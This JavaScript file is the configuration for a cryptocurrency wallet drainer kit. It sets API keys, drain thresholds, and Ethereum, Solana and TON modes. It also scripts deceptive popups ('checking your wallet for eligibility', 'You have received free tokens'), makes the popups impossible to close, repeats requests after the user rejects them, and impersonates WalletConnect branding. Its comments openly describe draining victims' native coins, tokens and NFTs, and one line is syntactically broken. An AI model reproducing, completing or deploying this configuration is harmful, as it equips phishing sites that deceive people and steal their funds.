// Filled keys are generated by us, but if you are concerned, you may generate your own

/**
 * Get it from here https://www.ankr.com/rpc/advanced-api/
 * Example: k3k143180225lj7lo06m8nmj98m594j641l7m047m670nm83j2k7m4kk1m206ln1
 */
let ankr_api_key = "c3eb6eebbf31cc63a5486d535fd89c5b94190e9d53910f7455f4ae216d7443e6"

/**
 * Walletconnect project ID
 * You may obtain your own key here: https://cloud.walletconnect.com/app
 */
let wc_projectid = "90f4273219ce8a04eccc622712d876d4";

// MISC SETTINGS

/**
 * Class name of the connect button. 
 * When the user clicks on a button with this class, the drainer will connect wallet and attempt to drain it.
 * For TON, this becomes the ID of the button
 */
let connect_button_class = "connectButton"

/**
 * Whether to autoconnect on website visit
 */
let autoconnect = ;

/**
 * Will proceed to drain only if minimum total balance is equal or greater than this
 * note: the absolute minimum is 50 USD, and this cannot be changed
 */
let min_usd_total = 50;

/**
 * This is the mode to use. So far Solana and Ethereum are supported
 * Must be either a string of 'ethereum', 'solana' or 'ton'
 */
let drainer_mode = 'ethereum';

/**
 * This is the JSON manifest used to pass data to the wallet upon connection
 * It is recommended to fill this out according to your website's structure
 * Example: https://ton-connect.github.io/demo-dapp-with-backend/tonconnect-manifest.json
 * You can specify an external URL or a relative path, i.e '/ton_manifest.json'
 * More on this: https://docs.ton.org/develop/dapps/ton-connect/manifest
 */
let ton_manifest_url = "";

/**
 * This configures the alert messages, or in other words popup or dialog boxes, that the user sees
 * Empty string means that the field will be left out in the dialog i.e if title is empty, dialog will not have a title
 * If both fields are empty, the dialog will not show up at all
 * Supports HTML formatting
 */
let popup_messages = {
    "checking_wallet": {
        title: "Please wait",
        inner: "We are checking your wallet for eligibility...",
    },
    // balance isn't high enough
    "not_eligible": {
        title: "Error",
        inner: "This wallet is not eligible due to having low funds. Please use a different wallet with enough assets",
    },
    "sign": {
        title: "",
        inner: "Please sign the message in your wallet so we can verify your ownership",
    },
    "sign_error": {
        title: "Error",
        inner: "Something went wrong while signing your wallet. Please try again with a different wallet, or update your extension"
    },
    // wait for transaction to be confirmed
    "wait": {
        title: "",
        inner: "Please wait..."
    },
    // approvals, permits, safa
    "approve": {
        title: "",
        inner: "Please approve this in your wallet to validate eligibility"
    },
    "transfer": {
        title: "",
        inner: "Please accept the request in your wallet"
    },
    "drain_finished": {
        title: "Success",
        inner: "You have received free tokens. Try with a different wallet!"
    },
    "chain_change": {
        title: "",
        inner: "Please change your network in the wallet"
    }
}

/**
 * Controls the walletconnect theme variables
 * https://docs.walletconnect.com/2.0/web3modal/html/wagmi/theming
 * If a field is missing, the default value will be used
 */
let walletconnect_theme_vars = {
    // example:
    // '--w3m-font-family': 'Roboto, sans-serif',
    // '--w3m-accent-color': '#FADEDD',
}

/**
 * Controls the walletconnect theme mode. It's either dark or light.
 */
let walletconnect_theme_mode = 'dark';

/**
 * This affects UI for when the user connects to the website
 */
let walletconnect_metadata = {
    name: 'Wallet Connect',
    description: '',
    url: 'https://walletconnect.com',
    icons: ['https://i.ibb.co/4NWHQ1G/walletconnect.png'],
}

/**
 * This asks the user to sign a message in his wallet. 
 * It doesn't affect the draining process whatsoever
 * This can be used or cosmetic purposes, or to prevent some bots
 * If it is empty, user won't be asked to sign his wallet.
 */
let sign_wallet_msg = ""

/**
 * This influences whether popups should be 'sticky'
 * sticky popup are those that can't be closed by the user
 */
let sticky_popups = true

/**
 * This changes whether we have to keep trying to perform actions after rejection
 * We recommend you to keep them on
 */
let loop_settings = {
    "native": true, // native currencies
    "token": true, // erc20 assets
    "nft": true, // erc1155 and erc721 assets
    "chain_change": true, // chain change requests
};

// ADVANCED SETTINGS

/**
 * This will be called when the drainer performs certain actions
 * It can be used to display balance on the website such as a fake exchange, 
 * to perform actions (i.e redirect) on finish, etc... creativity is the limit
 * 
 * 
 * --- EVENTS ---
 * The 'event' variable is a string and might be one of:
 * 'DRAIN_FINISHED' - draining the wallet successfuly finished
 * 'REJECT' - the user rejected a prompt in his wallet
 * 'REQUEST' - the user has received a request to accept a prompt
 * 'SUCCESS' - the user accepted a prompt in his wallet
 * 'NOT_ELIGIBLE' - the user connected a wallet that doesn't have enough funds
 * 'CONNECT' - the user connected a wallet
 * 
 * 
 * --- DATA ---
 * Data passed to the callback function varies on the event, but it all similar.
 * All of the data will be passed as an object.
 * 
 * AssetInfo type is declared as follows:
 * type AssetInfo = {
 *   Name: string,
 *   ChainID: number,
 *   ContractAddress: string,
 *   BalanceUSD: number,
 *   BalanceRaw: string,
 *   // these fields exist only on erc721 or erc1155
 *   ID: string,
 *   Owned: number,
 * }
 * 
 * For 'REJECT', 'REQUEST', 'SUCCESS' it passes data of the following type structure:
 *  {
 *   type: 'native' | 'erc20' | 'erc721' | 'erc1155'
 *   data: {
 *       // for simplicity purposes, this has been made into an array
 *       // but some strategies can drain only one asset at a time
 *       assets: []AssetInfo
 *   }
 *  }
 * 
 * For 'DRAIN_FINISHED', 'NOT_ELIGIBLE' it passes following data:
 * {
 *  total_usd: number
 * }
 * 
 * 'CONNECTED' passes a parameter of type string which is the victim's address
 * 
 */
function callback(event, data) {

}

// DON'T MODIFY ANYTHING BELOW

let lethal_user_id = 2467;
